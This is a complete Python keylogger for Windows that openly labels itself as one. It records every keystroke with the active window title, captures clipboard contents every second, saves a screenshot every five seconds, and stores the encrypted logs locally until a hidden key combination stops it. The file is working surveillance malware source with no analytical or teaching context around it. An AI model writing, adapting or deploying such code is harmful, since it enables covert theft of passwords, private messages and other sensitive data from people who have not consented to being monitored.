import pyperclip
import threading
import time
from pynput.keyboard import Listener, Key
from datetime import datetime
import win32gui
from cryptography.fernet import Fernet
from PIL import ImageGrab

last_window = None
pressed_keys = set()
stop_flag = threading.Event()

def load_key():
    with open("secret.key", "rb") as key_file:
        return key_file.read()

fernet = Fernet(load_key())

def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def log_encrypted(message):
    encrypted = fernet.encrypt(message.encode())
    with open("log.txt", "ab") as log_file:  
        log_file.write(encrypted + b"\n")

def log_keystroke(key):
    global last_window
    pressed_keys.add(key)
    # Check for Ctrl+Shift+Alt+M
    if ((Key.ctrl_l in pressed_keys or Key.ctrl_r in pressed_keys) and
        (Key.shift_l in pressed_keys or Key.shift_r in pressed_keys) and
        (Key.alt_l in pressed_keys or Key.alt_r in pressed_keys) and
        (getattr(key, 'char', '').lower() == 'm')):
        stop_flag.set()
        return False  # Stop the listener

    current_window = get_active_window()
    if current_window != last_window:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_encrypted(f"\n[{timestamp}] Active Window: {current_window}")
        last_window = current_window

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = key.char
        log_encrypted(f"[{timestamp}] {char}")
    except AttributeError:
        if key == key.space:
            log_encrypted(f"[{timestamp}] [SPACE]")
        elif key == key.enter:
            log_encrypted(f"[{timestamp}] [ENTER]")
        else:
            log_encrypted(f"[{timestamp}] [{key}]")

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def start_logging():
    with Listener(on_press=log_keystroke, on_release=on_release) as listener:
        listener.join()
def monitor_clipboard():
    recent_value = ""
    while not stop_flag.is_set():
        try:
            tmp_value = pyperclip.paste()
            if tmp_value != recent_value:
                recent_value = tmp_value
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_encrypted(f"[{timestamp}] [CLIPBOARD] {recent_value}")
        except Exception:
            pass
        time.sleep(1)
def capture_screenshot():
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    img = ImageGrab.grab()
    img.save(f"screenshot_{timestamp}.png")
def periodic_screenshot():
    while not stop_flag.is_set():
        capture_screenshot()
        time.sleep(5)  
if __name__ == "__main__":
    print("[+] Keylogger is running... (press CTRL + C to stop)")
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=periodic_screenshot, daemon=True).start()
    start_logging()